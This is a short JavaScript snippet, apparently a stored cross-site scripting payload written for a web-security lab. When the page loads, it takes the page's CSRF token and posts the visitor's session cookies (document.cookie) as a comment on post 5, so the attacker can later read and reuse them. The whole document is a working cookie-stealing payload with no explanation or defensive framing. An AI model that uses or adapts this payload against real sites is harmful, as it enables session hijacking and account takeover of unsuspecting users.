<script>
    window.addEventListener('DOMContentLoaded', function(){


var data = new FormData();
    var token= document.getElementsByName('csrf')[0].value;
    data.append('csrf', token);
    data.append('postId', 5);
    data.append('comment', document.cookie);
    data.append('name', 'victim0');
    data.append('email','da.@g');
    data.append('website', '');

    fetch('/post/comment',{
        method: 'POST',
    mode: 'no-cors',
    body: data
});
})
</script>